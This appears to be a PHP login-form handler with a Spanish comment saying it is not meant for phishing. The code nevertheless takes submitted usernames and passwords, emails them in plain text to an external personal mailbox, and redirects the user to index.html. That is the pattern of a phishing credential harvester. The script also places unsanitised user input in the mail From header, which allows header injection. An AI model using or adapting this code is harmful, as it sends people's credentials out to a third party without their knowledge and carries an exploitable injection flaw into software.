<?php
// la idea no es hacer phishing, sino que estos datos en vez de enviarse al mail se envíen a la base de datos y se contraste con el diccionario que contiene los datos de acceso
$user = $_POST["usuario"];
$password = $_POST["password"];

$header = "From: " . $user . " \r\n";
$header .= "X-Mailer: PHP/" . phpversion() . " \r\n";
$header .= "Mime-Version: 1.0 \r\n";
$header .= "Content-Type: text/plain";

$mensaje = "Nombre de Usuario " . $user . ",\r\n";
$mensaje .= "Password: " . $password . " \r\n";
$mensaje .= "Intento de ingreso " . date("d/m/Y", time());

$inbox = "benja.sarria@live.com.ar";
$asunto = "Inicio de Sesión";

mail($inbox, $asunto, utf8_decode($mensaje), $header);

header("Location:index.html");

?>